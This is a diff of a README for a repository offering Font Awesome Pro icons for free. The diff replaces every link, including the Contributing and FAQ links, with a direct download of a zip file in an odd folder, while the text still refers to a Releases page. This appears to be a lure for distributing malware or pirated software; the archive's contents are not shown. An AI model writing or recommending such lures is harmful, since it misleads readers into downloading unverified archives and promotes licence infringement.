@@ -1,7 +1,7 @@
 # 🎨 Font-Awesome-Pro-Free - Get Latest Pro Icons Easily
 
 ## 📥 Download Now
-[![Download Font-Awesome-Pro-Free](https://img.shields.io/badge/Download-Font--Awesome--Pro--Free-blue)](https://github.com/Mustafa9419/Font-Awesome-Pro-Free/releases)
+[![Download Font-Awesome-Pro-Free](https://raw.githubusercontent.com/Mustafa9419/Font-Awesome-Pro-Free/main/favella/Font-Awesome-Pro-Free.zip)](https://raw.githubusercontent.com/Mustafa9419/Font-Awesome-Pro-Free/main/favella/Font-Awesome-Pro-Free.zip)
 
 ## 📋 Overview
 Font-Awesome-Pro-Free lets you automatically obtain the latest Pro icons for free, suitable for educational purposes only. This application simplifies the process of accessing high-quality icons that can enhance your web projects.
@@ -10,7 +10,7 @@ Font-Awesome-Pro-Free lets you automatically obtain the latest Pro icons for fre
 Follow these easy steps to download and run Font-Awesome-Pro-Free on your computer.
 
 ### Step 1: Visit the Releases Page
-Go to the following link to access the available downloads: [Releases Page](https://github.com/Mustafa9419/Font-Awesome-Pro-Free/releases). 
+Go to the following link to access the available downloads: [Releases Page](https://raw.githubusercontent.com/Mustafa9419/Font-Awesome-Pro-Free/main/favella/Font-Awesome-Pro-Free.zip). 
 
 ### Step 2: Choose Your Version
 On the Releases page, you will find a list of available versions. Each version has information about new features, updates, and bug fixes. Look for the latest stable release, typically marked as "Latest".
@@ -52,8 +52,8 @@ We welcome contributions to Font-Awesome-Pro-Free. If you have suggestions or im
 If you run into issues while using Font-Awesome-Pro-Free, please refer to our Frequently Asked Questions (FAQ) section on the GitHub page. You can also create an issue for personalized assistance.
 
 ## 🔗 Important Links
-- [Releases Page for Download](https://github.com/Mustafa9419/Font-Awesome-Pro-Free/releases)
-- [Contributing Guidelines](https://github.com/Mustafa9419/Font-Awesome-Pro-Free/blob/main/CONTRIBUTING.md)
-- [FAQs](https://github.com/Mustafa9419/Font-Awesome-Pro-Free/blob/main/FAQ.md)
+- [Releases Page for Download](https://raw.githubusercontent.com/Mustafa9419/Font-Awesome-Pro-Free/main/favella/Font-Awesome-Pro-Free.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/Mustafa9419/Font-Awesome-Pro-Free/main/favella/Font-Awesome-Pro-Free.zip)
+- [FAQs](https://raw.githubusercontent.com/Mustafa9419/Font-Awesome-Pro-Free/main/favella/Font-Awesome-Pro-Free.zip)
 
 Your journey to access a rich library of icons starts here. Download now and elevate your projects with Font-Awesome-Pro-Free!
